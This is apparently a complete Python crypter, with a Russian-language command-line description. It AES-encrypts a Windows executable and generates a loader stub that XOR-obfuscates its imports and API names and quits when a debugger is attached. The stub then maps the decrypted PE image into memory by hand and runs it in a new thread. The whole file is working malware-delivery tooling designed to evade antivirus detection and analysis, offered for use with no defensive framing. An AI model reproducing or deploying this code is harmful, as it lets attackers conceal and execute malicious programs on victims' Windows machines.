import os
import base64
import math
import argparse
import secrets
import string
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

AES_BLOCK_SIZE = 16
AES_KEY_SIZE = 32

def xor_string_to_hex(data_str, key_str):
    key_bytes = key_str.encode('utf-8')
    data_bytes = data_str.encode('utf-8')
    key_len = len(key_bytes)
    result = bytearray()
    for i, byte in enumerate(data_bytes):
        result.append(byte ^ key_bytes[i % key_len])
    return result.hex()

def obfuscate_import_name(module_name, key_str):
    return xor_string_to_hex(module_name, key_str)

def encrypt_file(input_path, output_path):
    try:
        with open(input_path, 'rb') as f:
            data = f.read()
    except FileNotFoundError:
        return
    except IOError as e:
        return

    key_charset = string.ascii_letters + string.digits + string.punctuation
    XOR_KEY = ''.join(secrets.choice(key_charset) for _ in range(32))

    key = os.urandom(AES_KEY_SIZE)
    iv = os.urandom(AES_BLOCK_SIZE)

    padder = padding.PKCS7(AES_BLOCK_SIZE * 8).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    encoded_key = base64.b64encode(key).decode('utf-8')
    encoded_iv = base64.b64encode(iv).decode('utf-8')
    encoded_data = base64.b64encode(encrypted_data).decode('utf-8')

    obfuscated_key_hex = xor_string_to_hex(encoded_key, XOR_KEY)
    obfuscated_iv_hex = xor_string_to_hex(encoded_iv, XOR_KEY)
    obfuscated_data_hex = xor_string_to_hex(encoded_data, XOR_KEY)

    chunk_size = 500
    num_chunks = math.ceil(len(obfuscated_data_hex) / chunk_size)
    data_chunks = [obfuscated_data_hex[i * chunk_size:(i + 1) * chunk_size] for i in range(num_chunks)]

    data_chunks_repr = '\n'.join([f"        \'{chunk}\'," for chunk in data_chunks])
    if data_chunks_repr.endswith(','):
        data_chunks_repr = data_chunks_repr[:-1]

    b64_name = obfuscate_import_name('base64', XOR_KEY)
    os_name = obfuscate_import_name('os', XOR_KEY)
    sys_name = obfuscate_import_name('sys', XOR_KEY)
    plat_name = obfuscate_import_name('platform', XOR_KEY)
    ctypes_name = obfuscate_import_name('ctypes', XOR_KEY)
    ctypes_wintypes_name = obfuscate_import_name('ctypes.wintypes', XOR_KEY)
    struct_name = obfuscate_import_name('struct', XOR_KEY)
    ciph_name = obfuscate_import_name('cryptography.hazmat.primitives.ciphers', XOR_KEY)
    algo_name = obfuscate_import_name('cryptography.hazmat.primitives.ciphers.algorithms', XOR_KEY)
    modes_name = obfuscate_import_name('cryptography.hazmat.primitives.ciphers.modes', XOR_KEY)
    pad_name = obfuscate_import_name('cryptography.hazmat.primitives.padding', XOR_KEY)
    back_name = obfuscate_import_name('cryptography.hazmat.backends', XOR_KEY)

    k32_name = obfuscate_import_name('kernel32.dll', XOR_KEY)
    ll_name = obfuscate_import_name('LoadLibraryA', XOR_KEY)
    gpa_name = obfuscate_import_name('GetProcAddress', XOR_KEY)
    va_name = obfuscate_import_name('VirtualAlloc', XOR_KEY)
    vp_name = obfuscate_import_name('VirtualProtect', XOR_KEY)
    vf_name = obfuscate_import_name('VirtualFree', XOR_KEY)
    ct_name = obfuscate_import_name('CreateThread', XOR_KEY)
    wso_name = obfuscate_import_name('WaitForSingleObject', XOR_KEY)
    ch_name = obfuscate_import_name('CloseHandle', XOR_KEY)
    ms_name = obfuscate_import_name('memset', XOR_KEY)

    idp_name = obfuscate_import_name('IsDebuggerPresent', XOR_KEY)

    utf8_str_obf = xor_string_to_hex('utf-8', XOR_KEY)
    dot_str_obf = xor_string_to_hex('.', XOR_KEY)
    wintypes_str_obf = xor_string_to_hex('ctypes.wintypes', XOR_KEY)
    ascii_str_obf = xor_string_to_hex('ascii', XOR_KEY)
    windows_str_obf = xor_string_to_hex('Windows', XOR_KEY)

    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20
    PAGE_READONLY = 0x02
    PAGE_EXECUTE = 0x10
    IMAGE_SCN_MEM_EXECUTE = 0x20000000
    IMAGE_SCN_MEM_READ = 0x40000000
    IMAGE_SCN_MEM_WRITE = 0x80000000

    stub_code = f"""
_XOR_KEY = {json.dumps(XOR_KEY)}

def _xor_h_str_dec(hds, ks):
    _utf8_str = \"'{utf8_str_obf}'\"
    try:
        kb = ks.encode(_xor_h_str_dec(_utf8_str, _XOR_KEY))
        db = bytes.fromhex(hds)
        kl = len(kb)
        r = bytearray()
        for i, b in enumerate(db):
            r.append(b ^ kb[i % kl])
        return r.decode(_xor_h_str_dec(_utf8_str, _XOR_KEY))
    except Exception:
        return ""

def _imp(mod_name_hex):
    _dot_str = \"'{dot_str_obf}'\"
    decoded_name = _xor_h_str_dec(mod_name_hex, _XOR_KEY)
    if not decoded_name: return None
    parts = decoded_name.split(_xor_h_str_dec(_dot_str, _XOR_KEY))
    try:
        m = __import__(parts[0])
        for p in parts[1:]:
            m = getattr(m, p)
        return m
    except ImportError:
        return None
    except AttributeError:
        return None

_b64 = _imp('{b64_name}')
_os = _imp('{os_name}')
_sys = _imp('{sys_name}')
_plat = _imp('{plat_name}')
_ctypes = _imp('{ctypes_name}')
_struct = _imp('{struct_name}')
_ciph = _imp('{ciph_name}')
_algo = _imp('{algo_name}')
_modes = _imp('{modes_name}')
_pad = _imp('{pad_name}')
_back = _imp('{back_name}')

_wintypes = None
if _ctypes:
    _wintypes_mod_str = \"'{wintypes_str_obf}'\"
    try:
        _wintypes = _imp('{ctypes_wintypes_name}')
        if not _wintypes:
             _wintypes = __import__(_xor_h_str_dec(_wintypes_mod_str, _XOR_KEY), fromlist=['ctypes'])
    except:
         pass

if not all([_b64, _os, _sys, _plat, _ctypes, _struct, _ciph, _algo, _modes, _pad, _back]):
    _sys.exit(1)


_k32_obf = '{k32_name}'
_ll_obf = '{ll_name}'
_gpa_obf = '{gpa_name}'
_va_obf = '{va_name}'
_vp_obf = '{vp_name}'
_vf_obf = '{vf_name}'
_ct_obf = '{ct_name}'
_wso_obf = '{wso_name}'
_ch_obf = '{ch_name}'
_ms_obf = '{ms_name}'

_k32_handle = None
_LoadLibraryA = None
_GetProcAddress = None
_VirtualAlloc = None
_VirtualProtect = None
_VirtualFree = None
_CreateThread = None
_WaitForSingleObject = None
_CloseHandle = None
_memset = None
_IsDebuggerPresent = None

def _resolve_apis():
    global _k32_handle, _LoadLibraryA, _GetProcAddress, _VirtualAlloc, _VirtualProtect, _VirtualFree
    global _CreateThread, _WaitForSingleObject, _CloseHandle, _memset, _IsDebuggerPresent

    k32_name_dec = _xor_h_str_dec(_k32_obf, _XOR_KEY)
    if not k32_name_dec: return False

    try:
        _k32_handle_temp = _ctypes.windll.kernel32
        gpa_dec = _xor_h_str_dec(_gpa_obf, _XOR_KEY)
        if not gpa_dec: return False
        _ascii_str = \"'{ascii_str_obf}'\"
        _GetProcAddress_addr = _k32_handle_temp._handle + _k32_handle_temp._FuncPtr((gpa_dec).encode(_xor_h_str_dec(_ascii_str, _XOR_KEY))).value
        GPA_PROTO = _ctypes.WINFUNCTYPE(_ctypes.c_void_p, _ctypes.c_void_p, _ctypes.c_char_p)
        _GetProcAddress = GPA_PROTO(_GetProcAddress_addr)

        ll_dec = _xor_h_str_dec(_ll_obf, _XOR_KEY)
        if not ll_dec: return False

        _k32_handle = _k32_handle_temp._handle

        _LoadLibraryA_addr = _GetProcAddress(_k32_handle, ll_dec.encode(_xor_h_str_dec('{utf8_str_obf}', _XOR_KEY)))
        if not _LoadLibraryA_addr: return False
        LLA_PROTO = _ctypes.WINFUNCTYPE(_ctypes.c_void_p, _ctypes.c_char_p)
        _LoadLibraryA = LLA_PROTO(_LoadLibraryA_addr)

    except Exception:
        return False

    api_map = {{
        _va_obf: ('_VirtualAlloc', _ctypes.WINFUNCTYPE(_ctypes.c_void_p, _ctypes.c_void_p, _ctypes.c_size_t, _ctypes.c_ulong, _ctypes.c_ulong)),
        _vp_obf: ('_VirtualProtect', _ctypes.WINFUNCTYPE(_ctypes.c_bool, _ctypes.c_void_p, _ctypes.c_size_t, _ctypes.c_ulong, _ctypes.POINTER(_ctypes.c_ulong))),
        _vf_obf: ('_VirtualFree', _ctypes.WINFUNCTYPE(_ctypes.c_bool, _ctypes.c_void_p, _ctypes.c_size_t, _ctypes.c_ulong)),
        _ct_obf: ('_CreateThread', _ctypes.WINFUNCTYPE(_ctypes.c_void_p, _ctypes.c_void_p, _ctypes.c_size_t, _ctypes.c_void_p, _ctypes.c_void_p, _ctypes.c_ulong, _ctypes.POINTER(_ctypes.c_ulong))),
        _wso_obf: ('_WaitForSingleObject', _ctypes.WINFUNCTYPE(_ctypes.c_ulong, _ctypes.c_void_p, _ctypes.c_ulong)),
        _ch_obf: ('_CloseHandle', _ctypes.WINFUNCTYPE(_ctypes.c_bool, _ctypes.c_void_p)),
        _ms_obf: ('_memset', _ctypes.WINFUNCTYPE(_ctypes.c_void_p, _ctypes.c_void_p, _ctypes.c_int, _ctypes.c_size_t)),
        '{idp_name}': ('_IsDebuggerPresent', _ctypes.WINFUNCTYPE(_ctypes.c_bool)),
    }}

    for obf_name, (global_var_name, proto) in api_map.items():
        func_name_dec = _xor_h_str_dec(obf_name, _XOR_KEY)
        if not func_name_dec: return False
        addr = _GetProcAddress(_k32_handle, func_name_dec.encode(_xor_h_str_dec('{utf8_str_obf}', _XOR_KEY)))
        if not addr: return False
        globals()[global_var_name] = proto(addr)

    if not all([_VirtualAlloc, _VirtualProtect, _VirtualFree, _CreateThread, _WaitForSingleObject, _CloseHandle]):
        return False

    return True

if not _resolve_apis():
    _sys.exit(1)


MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_READONLY = 0x02
PAGE_EXECUTE = 0x10
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000
INFINITE = 0xFFFFFFFF

sizeof_long = _ctypes.sizeof(_ctypes.c_long)
sizeof_int = _ctypes.sizeof(_ctypes.c_int)
sizeof_short = _ctypes.sizeof(_ctypes.c_short)
sizeof_char = _ctypes.sizeof(_ctypes.c_char)
sizeof_ptr = _ctypes.sizeof(_ctypes.c_void_p)

class IMAGE_DOS_HEADER(_ctypes.Structure):
    _fields_ = [
        ('e_magic', _ctypes.c_ushort),
        ('e_cblp', _ctypes.c_ushort),
        ('e_cp', _ctypes.c_ushort),
        ('e_crlc', _ctypes.c_ushort),
        ('e_cparhdr', _ctypes.c_ushort),
        ('e_minalloc', _ctypes.c_ushort),
        ('e_maxalloc', _ctypes.c_ushort),
        ('e_ss', _ctypes.c_ushort),
        ('e_sp', _ctypes.c_ushort),
        ('e_csum', _ctypes.c_ushort),
        ('e_ip', _ctypes.c_ushort),
        ('e_cs', _ctypes.c_ushort),
        ('e_lfarlc', _ctypes.c_ushort),
        ('e_ovno', _ctypes.c_ushort),
        ('e_res', _ctypes.c_ushort * 4),
        ('e_oemid', _ctypes.c_ushort),
        ('e_oeminfo', _ctypes.c_ushort),
        ('e_res2', _ctypes.c_ushort * 10),
        ('e_lfanew', _ctypes.c_long),
    ]

class IMAGE_FILE_HEADER(_ctypes.Structure):
    _fields_ = [
        ('Machine', _ctypes.c_ushort),
        ('NumberOfSections', _ctypes.c_ushort),
        ('TimeDateStamp', _ctypes.c_ulong),
        ('PointerToSymbolTable', _ctypes.c_ulong),
        ('NumberOfSymbols', _ctypes.c_ulong),
        ('SizeOfOptionalHeader', _ctypes.c_ushort),
        ('Characteristics', _ctypes.c_ushort),
    ]

class IMAGE_DATA_DIRECTORY(_ctypes.Structure):
    _fields_ = [
        ('VirtualAddress', _ctypes.c_ulong),
        ('Size', _ctypes.c_ulong),
    ]

class IMAGE_OPTIONAL_HEADER64(_ctypes.Structure):
     _fields_ = [
        ('Magic', _ctypes.c_ushort),
        ('MajorLinkerVersion', _ctypes.c_ubyte),
        ('MinorLinkerVersion', _ctypes.c_ubyte),
        ('SizeOfCode', _ctypes.c_ulong),
        ('SizeOfInitializedData', _ctypes.c_ulong),
        ('SizeOfUninitializedData', _ctypes.c_ulong),
        ('AddressOfEntryPoint', _ctypes.c_ulong),
        ('BaseOfCode', _ctypes.c_ulong),
        ('ImageBase', _ctypes.c_ulonglong),
        ('SectionAlignment', _ctypes.c_ulong),
        ('FileAlignment', _ctypes.c_ulong),
        ('MajorOperatingSystemVersion', _ctypes.c_ushort),
        ('MinorOperatingSystemVersion', _ctypes.c_ushort),
        ('MajorImageVersion', _ctypes.c_ushort),
        ('MinorImageVersion', _ctypes.c_ushort),
        ('MajorSubsystemVersion', _ctypes.c_ushort),
        ('MinorSubsystemVersion', _ctypes.c_ushort),
        ('Win32VersionValue', _ctypes.c_ulong),
        ('SizeOfImage', _ctypes.c_ulong),
        ('SizeOfHeaders', _ctypes.c_ulong),
        ('CheckSum', _ctypes.c_ulong),
        ('Subsystem', _ctypes.c_ushort),
        ('DllCharacteristics', _ctypes.c_ushort),
        ('SizeOfStackReserve', _ctypes.c_ulonglong),
        ('SizeOfStackCommit', _ctypes.c_ulonglong),
        ('SizeOfHeapReserve', _ctypes.c_ulonglong),
        ('SizeOfHeapCommit', _ctypes.c_ulonglong),
        ('LoaderFlags', _ctypes.c_ulong),
        ('NumberOfRvaAndSizes', _ctypes.c_ulong),
        ('DataDirectory', IMAGE_DATA_DIRECTORY * 16),
    ]

class IMAGE_NT_HEADERS64(_ctypes.Structure):
    _fields_ = [
        ('Signature', _ctypes.c_ulong),
        ('FileHeader', IMAGE_FILE_HEADER),
        ('OptionalHeader', IMAGE_OPTIONAL_HEADER64),
    ]

class IMAGE_SECTION_HEADER(_ctypes.Structure):
    _fields_ = [
        ('Name', _ctypes.c_char * 8),
        ('Misc_VirtualSize', _ctypes.c_ulong),
        ('VirtualAddress', _ctypes.c_ulong),
        ('SizeOfRawData', _ctypes.c_ulong),
        ('PointerToRawData', _ctypes.c_ulong),
        ('PointerToRelocations', _ctypes.c_ulong),
        ('PointerToLinenumbers', _ctypes.c_ulong),
        ('NumberOfRelocations', _ctypes.c_ushort),
        ('NumberOfLinenumbers', _ctypes.c_ushort),
        ('Characteristics', _ctypes.c_ulong),
    ]

class IMAGE_IMPORT_DESCRIPTOR(_ctypes.Structure):
    _fields_ = [
        ('OriginalFirstThunk', _ctypes.c_ulong),
        ('TimeDateStamp', _ctypes.c_ulong),
        ('ForwarderChain', _ctypes.c_ulong),
        ('Name', _ctypes.c_ulong),
        ('FirstThunk', _ctypes.c_ulong),
    ]

SECTION_CHARACTERISTICS_MAP = {{
    (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE): {PAGE_EXECUTE_READWRITE},
    (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ): {PAGE_EXECUTE_READ},
    (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE): {PAGE_READWRITE},
    (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE): {PAGE_EXECUTE_READWRITE},
    (IMAGE_SCN_MEM_READ): {PAGE_READONLY},
    (IMAGE_SCN_MEM_EXECUTE): {PAGE_EXECUTE},
    (IMAGE_SCN_MEM_WRITE): {PAGE_READWRITE},
}}
DEFAULT_PAGE_PROTECTION = {PAGE_READONLY}

def aj7kldo(payload_bytes):
    thread_handle = None
    allocated_base = None
    try:
        dos_header = IMAGE_DOS_HEADER.from_buffer_copy(payload_bytes)
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE:
            return False

        nt_header_offset = dos_header.e_lfanew
        nt_headers = IMAGE_NT_HEADERS64.from_buffer_copy(payload_bytes, nt_header_offset)
        if nt_headers.Signature != IMAGE_NT_SIGNATURE:
            return False

        if nt_headers.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64:
             return False

        image_base = nt_headers.OptionalHeader.ImageBase
        size_of_image = nt_headers.OptionalHeader.SizeOfImage

        ptr = _VirtualAlloc(
            _ctypes.c_void_p(image_base),
            _ctypes.c_size_t(size_of_image),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        )
        if not ptr:
            ptr = _VirtualAlloc(
                _ctypes.c_void_p(0),
                _ctypes.c_size_t(size_of_image),
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE
            )
            if not ptr:
                return False

        allocated_base = ptr
        base_delta = allocated_base - image_base

        _ctypes.memmove(allocated_base, payload_bytes, nt_headers.OptionalHeader.SizeOfHeaders)

        section_header_offset = nt_header_offset + _ctypes.sizeof(IMAGE_NT_HEADERS64)
        num_sections = nt_headers.FileHeader.NumberOfSections

        for i in range(num_sections):
            section_hdr = IMAGE_SECTION_HEADER.from_buffer_copy(payload_bytes, section_header_offset + i * _ctypes.sizeof(IMAGE_SECTION_HEADER))
            section_dest = allocated_base + section_hdr.VirtualAddress
            section_src = payload_bytes[section_hdr.PointerToRawData : section_hdr.PointerToRawData + section_hdr.SizeOfRawData]
            if section_src and section_hdr.SizeOfRawData > 0:
                _ctypes.memmove(section_dest, section_src, len(section_src))

        import_dir = nt_headers.OptionalHeader.DataDirectory[1]
        if import_dir.VirtualAddress != 0:
            import_desc_addr = allocated_base + import_dir.VirtualAddress
            desc_size = _ctypes.sizeof(IMAGE_IMPORT_DESCRIPTOR)

            while True:
                import_desc = IMAGE_IMPORT_DESCRIPTOR.from_address(import_desc_addr)
                if import_desc.Name == 0:
                    break

                dll_name_addr = allocated_base + import_desc.Name
                dll_name = _ctypes.c_char_p(dll_name_addr).value

                if not dll_name:
                    break

                try:
                    h_module = _LoadLibraryA(dll_name)
                    if not h_module:
                        import_desc_addr += desc_size
                        continue
                except Exception:
                    import_desc_addr += desc_size
                    continue

                first_thunk_rva = import_desc.FirstThunk
                if import_desc.OriginalFirstThunk != 0:
                    first_thunk_rva = import_desc.OriginalFirstThunk

                thunk_addr = allocated_base + first_thunk_rva
                iat_addr_entry = allocated_base + import_desc.FirstThunk

                while True:
                    thunk_data = _ctypes.c_ulonglong.from_address(thunk_addr).value
                    if thunk_data == 0:
                        break

                    func_addr = 0
                    if thunk_data & (1 << (sizeof_ptr * 8 - 1)):
                        ordinal = thunk_data & 0xFFFF
                        func_addr = _GetProcAddress(h_module, _ctypes.c_void_p(ordinal))
                    else:
                        func_name_addr = allocated_base + thunk_data + 2
                        func_name = _ctypes.c_char_p(func_name_addr).value
                        if func_name:
                           func_addr = _GetProcAddress(h_module, func_name)

                    if not func_addr:
                        if _memset:
                            _memset(iat_addr_entry, 0, sizeof_ptr)
                        else:
                            temp_null_ptr = _ctypes.c_ulonglong(0)
                            _ctypes.memmove(iat_addr_entry, _ctypes.byref(temp_null_ptr), sizeof_ptr)
                    else:
                        _ctypes.memmove(iat_addr_entry, _ctypes.byref(_ctypes.c_ulonglong(func_addr)), sizeof_ptr)

                    thunk_addr += sizeof_ptr
                    iat_addr_entry += sizeof_ptr

                import_desc_addr += desc_size

        if base_delta != 0:
            reloc_dir = nt_headers.OptionalHeader.DataDirectory[5]
            if reloc_dir.VirtualAddress != 0 and reloc_dir.Size > 0:
                reloc_block_addr = allocated_base + reloc_dir.VirtualAddress
                reloc_end = reloc_block_addr + reloc_dir.Size

                while reloc_block_addr < reloc_end:
                    base_rva = _ctypes.c_ulong.from_address(reloc_block_addr).value
                    block_size = _ctypes.c_ulong.from_address(reloc_block_addr + sizeof_long).value

                    if block_size == 0: break

                    num_entries = (block_size - sizeof_long * 2) // sizeof_short
                    entry_addr = reloc_block_addr + sizeof_long * 2

                    for i in range(num_entries):
                        reloc_entry = _ctypes.c_ushort.from_address(entry_addr + i * sizeof_short).value
                        reloc_type = reloc_entry >> 12
                        reloc_offset = reloc_entry & 0x0FFF

                        if reloc_type == 0:
                            pass
                        elif reloc_type == 10:
                            patch_addr = allocated_base + base_rva + reloc_offset
                            if patch_addr >= allocated_base and patch_addr < allocated_base + size_of_image:
                                original_addr = _ctypes.c_ulonglong.from_address(patch_addr).value
                                new_addr = original_addr + base_delta
                                _ctypes.memmove(patch_addr, _ctypes.byref(_ctypes.c_ulonglong(new_addr)), sizeof_ptr)
                        else:
                            pass

                    reloc_block_addr += block_size

        old_protect = _ctypes.c_ulong()
        for i in range(num_sections):
            section_hdr = IMAGE_SECTION_HEADER.from_buffer_copy(payload_bytes, section_header_offset + i * _ctypes.sizeof(IMAGE_SECTION_HEADER))
            section_addr = allocated_base + section_hdr.VirtualAddress
            size = section_hdr.Misc_VirtualSize
            if size == 0: continue

            characteristics = section_hdr.Characteristics
            mem_flags = characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)

            protection = SECTION_CHARACTERISTICS_MAP.get(mem_flags, DEFAULT_PAGE_PROTECTION)

            if not _VirtualProtect(
                _ctypes.c_void_p(section_addr),
                _ctypes.c_size_t(size),
                _ctypes.c_ulong(protection),
                _ctypes.byref(old_protect)
            ):
                return False

        entry_point_rva = nt_headers.OptionalHeader.AddressOfEntryPoint
        entry_point_addr = allocated_base + entry_point_rva

        THREAD_FUNC = _ctypes.CFUNCTYPE(_ctypes.c_ulong, _ctypes.c_void_p)
        thread_func = THREAD_FUNC(entry_point_addr)

        thread_id = _ctypes.c_ulong(0)
        thread_handle = _CreateThread(
            _ctypes.c_void_p(0),
            _ctypes.c_size_t(0),
            thread_func,
            _ctypes.c_void_p(0),
            _ctypes.c_ulong(0),
            _ctypes.byref(thread_id)
        )

        if thread_handle:
            _WaitForSingleObject(thread_handle, INFINITE)
            _CloseHandle(thread_handle)
            thread_handle = None
        else:
            if allocated_base:
                _VirtualFree(_ctypes.c_void_p(allocated_base), 0, MEM_RELEASE)
            return False

        if allocated_base:
            _VirtualFree(_ctypes.c_void_p(allocated_base), 0, MEM_RELEASE)
            allocated_base = None
        return True

    except Exception as e:
        if thread_handle:
            _CloseHandle(thread_handle)
        if allocated_base:
            _VirtualFree(_ctypes.c_void_p(allocated_base), 0, MEM_RELEASE)
        return False


_AES_BLOCK_SIZE = {AES_BLOCK_SIZE}
_OBF_KEY_HEX = '{obfuscated_key_hex}'
_OBF_IV_HEX = '{obfuscated_iv_hex}'
_OBF_DATA_PARTS = [
{data_chunks_repr}
]

def khuods9():
    if _IsDebuggerPresent and _IsDebuggerPresent():
        _sys.exit(2)

    key_b64 = _xor_h_str_dec(_OBF_KEY_HEX, _XOR_KEY)
    iv_b64 = _xor_h_str_dec(_OBF_IV_HEX, _XOR_KEY)
    enc_data_b64 = _xor_h_str_dec("".join(_OBF_DATA_PARTS), _XOR_KEY)

    if not key_b64 or not iv_b64 or not enc_data_b64:
        return

    try:
        _DEF_BACKEND = _back.default_backend()
        k = _b64.b64decode(key_b64)
        i_v = _b64.b64decode(iv_b64)
        enc_d = _b64.b64decode(enc_data_b64)
    except Exception as e:
        return

    try:
        cipher = _ciph.Cipher(_algo.AES(k), _modes.CBC(i_v), backend=_DEF_BACKEND)
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(enc_d) + decryptor.finalize()

        unpadder = _pad.PKCS7(_AES_BLOCK_SIZE * 8).unpadder()
        decrypted_data = unpadder.update(padded_data) + unpadder.finalize()
    except Exception as e:
        return

    aj7kldo(decrypted_data)

if __name__ == "__main__":
    if _plat.system() == _xor_h_str_dec('{windows_str_obf}', _XOR_KEY):
        khuods9()

"""

    stub_code = stub_code.strip()

    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(stub_code)
    except IOError as e:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Шифрует exe файл и создает загрузчик на Python.")
    parser.add_argument("input_file", help="Путь к exe файлу для шифрования (.exe).")
    parser.add_argument("output_file", help="Путь для сохранения сгенерированного загрузчика (.py).")

    args = parser.parse_args()

    encrypt_file(args.input_file, args.output_file) 
